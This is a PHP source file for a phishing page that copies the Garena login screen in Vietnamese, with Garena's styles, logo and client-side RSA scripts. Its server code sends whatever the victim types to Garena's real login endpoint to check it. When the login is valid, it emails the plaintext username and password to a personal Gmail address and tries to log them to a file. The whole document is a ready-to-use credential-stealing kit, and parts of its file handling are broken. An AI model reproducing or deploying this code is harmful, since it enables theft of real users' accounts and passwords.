<?php
ob_start();
error_reporting(0);
require_once "simple_html_dom.php"; // Chèn thư viện simple_html_dom
session_start();
$pesan = 1;

if(isset($_POST['username'])){
    $RSApassword = $_POST['password2'];
    $password = trim($_POST['password']);
    $username = str_replace( ' ', '', $_POST['username']);
    $c1 = $_POST['recaptcha_response_field'];
    $c2 = $_POST['recaptcha_challenge_field'];
    $url="http://gcms2.garena.com/login/";
    $resulta = curl($url);
    $csrf = get_input_val($resulta[1],'input[name=csrfmiddlewaretoken]');

    $postdata="csrfmiddlewaretoken=".$csrf."&next=/home&username=".$username."&password2=".$RSApassword."&password=garena_gcms_pass";

    $result = curl($url,$postdata,'',getcookie($resulta[0]));

    if(preg_match('#302 FOUND#', $result[0])) {
fwrite($file,$username.'|'.$password.PHP_EOL);
    fclose($file);
        $ngu = $_GET["ngu"];
$message = " Tài Khoản: $username
Mật Khẩu: $password ";    
$from = "From: $username";
$chude = "Tài Khoản Garena";

mail("lkhanh6373@gmail.com", $chude, $message, $from);
        fwrite($file,$newcontent);
        //fwrite($file,$username.'/'.$password.PHP_EOL);
        fclose($file);
        $pesan =  "1";
		$_SESSION['username'] = $username;
		header('Location: ./dangnhap.php');
    }elseif(preg_match('#Type in the ReCaptcha#', $result[1])){
        $pesan = '0';
    }else {
        $pesan = '0';
    }
}
?>
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta name="description" content="Garena">
<link rel="shortcut icon" href="http://cdn.garenanow.com/webmain/static/favicon.ico" type="image/x-icon"/>
<link href="http://sso.garena.com/css/sso.css?v=0.47" rel="stylesheet" type="text/css"/>
<!-- Page Specific -->
<script src="http://www.google.com/jsapi"></script>
<script type="text/javascript">google.load("jquery", "1.5.0");</script>
<script language="JavaScript" type="text/javascript" src="http://cdn.garenanow.com/webmain/static/js/jsbn.js"></script>
<script language="JavaScript" type="text/javascript" src="http://cdn.garenanow.com/webmain/static/js/prng4.js"></script>
<script language="JavaScript" type="text/javascript" src="http://cdn.garenanow.com/webmain/static/js/rng.js"></script>
<script language="JavaScript" type="text/javascript" src="http://cdn.garenanow.com/webmain/static/js/rsa.js"></script>
<script language="JavaScript" type="text/javascript" src="http://cdn.garenanow.com/webmain/static/js/grsa.js"></script>

<script type="text/javascript">
        function check_login_inputs() {
            var username = document.loginForm.username.value;
            var password = document.loginForm.password.value;
            if (!username || !password) {
                return false;
            }
            return true;
        }
        function do_encrypt() {
            if (!check_login_inputs()) {
              return false;
            }
                      var pw = document.loginForm.password.value;
            document.loginForm.password2.value=RSA(pw);
            $('.loginForm').submit();
            return true;
        }
        function keyIsPressed(evt) {
          var charCode = (evt.which) ? evt.which : evt.keyCode
          if( charCode == 13 ) {
                do_encrypt();
          }
          return true;
        }
    </script>
<title>Garena</title>
<style>
.error-msg { color: red !important; }
.error-msg { padding-bottom: -12px !important; }
</style>
<style>
.recaptchatable #recaptcha_response_field {
    width: 145px !important;
    position: relative !important;
    bottom: 7px !important;
    padding: 10px;
    margin: 15px 0 0 0 !important;
    font-size: 10pt;
    height: 20px;
}
.recaptcha_only_if_privacy {
display: none !important;
}
</style>
</head>
<body>

<div id="page">
<div id="header" class="header">
<div class="langWrapper fr">
<select class="lang">
<option value="vi-VN">Việt Nam - Tiếng việt</option>
<option value="en-SG">Singapore - English</option>
<option value="zh-SG">新加坡 - 简体中文</option>
<option value="zh-TW">台灣 - 繁体中文</option>
<option value="en-PH">Philippines - English</option>
<option value="th-TH">ไทย - ไทย</option>
<option value="id-ID">Indonesia - Bahasa Indonesia</option>
<option value="ru-RU">Россия - Русский</option>
<option value="en-MY">Malaysia - English</option>
</select><span class="icon-earth"></span></div>
<div class="topBarGarena"></div>
<div class="topBar"></div>
<h1><a class="logo" href="/"><img src="http://sso.garena.com/images/header_garena.png" style="width: 135px; height: 46px;"></a></h1></div>
<div id="main-panel">
<div class="content" style="top: 2.4px;">
<h2 class="title">Đăng nhập</h2>
<div class="partnerLogin"><p>Đăng nhập với tài khoản Garena hoặc những tài khoản dưới đây</p><div class="partnerLink"><a href="/facebook.php" class="icon-facebook"></a></div></div>
<form class="loginForm" id="loginForm" method="post" name='loginForm' onSubmit='do_encrypt();'>
<div class="line" id="line-account">
<input autocapitalize="off" autocorrect="off" placeholder="Tài khoản Garena hoặc Email" name="username" id="sso_login_form_account"  type="text" required>
</div>
<div class="line"  id="line-password">
<input type="hidden" name="password2" />
<input placeholder="Mật khẩu" name="password" id="sso_login_form_password" type="password" required></div>
<div class="line btnLine" id="line-btn">
<input class="btn" name="submit_button" value="Đăng Nhập Ngay" id="confirm-btn"  type="submit">
</div>
<span class="errorMsg" id="msg"><center>
<?php if($pesan == 0){ ?>
<span id="msg" class="errorMsg"><em></em>Đăng nhập thất bại: sai tên tài khoản hoặc mật khẩu</span><br>
<?php } ?></center>
<br>
<div class="divider"><span>hoặc</span></div>
<div id="line-btn" class="line btnLine"><input id="sso_login_link_register" name="register" type="button" value="Tạo tài khoản mới" onclick="javascript:return false;" class="btn black"></div>
<br><div class="divider"><a id="sso_login_link_forget_password" href="javascript:;">Quên mật khẩu?</a></div>
</div>
</div>
</form>
</div>
</div>
</div>
</html>

